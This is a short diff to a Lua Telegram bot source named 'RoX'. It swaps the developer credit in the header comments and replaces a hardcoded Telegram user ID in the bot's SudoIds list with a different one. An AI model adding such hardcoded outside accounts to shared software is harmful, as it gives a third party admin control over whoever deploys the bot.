@@ -1,5 +1,5 @@
 ------------------------------------------------
--- This Source Was Developed By (Abs) @XXXaa1212.--
+-- This Source Was Developed By (Abs) @IZIZ7I.--
 --   This Is The Source Channel @RR17D .   --
 --                - RoX -                 --
 --        -- https://t.me/RoX_SoURcE --         --
@@ -124,7 +124,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1320897678}
+SudoIds = {Config.SudoIds,1874628385}
 RoX = Config.RoX
 TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(RoX..'Abs:NameBot') or 'روكس')
@@ -11297,7 +11297,7 @@ end
 --     Source RoX     --
 end 
 ------------------------------------------------
--- This Source Was Developed By @XXXaa1212       .--
+-- This Source Was Developed By @IZIZ7I       .--
 --   This Is The Source Channel @RR17D.       --
 --                - RoX -                  --
 --        -- https://t.me/RoX_SoURcE --       --
